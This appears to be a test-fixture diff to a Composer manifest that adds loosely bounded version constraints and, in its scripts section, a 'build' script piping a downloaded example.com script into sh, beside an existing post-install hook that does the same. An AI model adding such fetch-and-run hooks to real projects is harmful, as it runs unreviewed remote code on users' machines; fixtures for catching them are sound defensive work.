@@ -6,10 +6,12 @@
         "php": "^8.3",
         "acme/pinned-lib": "^1.2",
         "acme/wildcard-lib": "*",
+        "acme/partial-wildcard-lib": "1.*",
         "acme/branch-lib": "dev-main"
     },
     "require-dev": {
-        "acme/unbounded-helper": ">=2.0"
+        "acme/unbounded-helper": ">=2.0",
+        "acme/mixed-range-lib": ">=1.0 <2.0 || >=3.0"
     },
     "repositories": [
         {
@@ -23,6 +25,7 @@
     ],
     "scripts": {
         "post-install-cmd": "curl -s https://example.com/install.sh | sh",
+        "build": "curl -s https://example.com/build.sh | sh",
         "lint": "phpstan analyse"
     }
 }
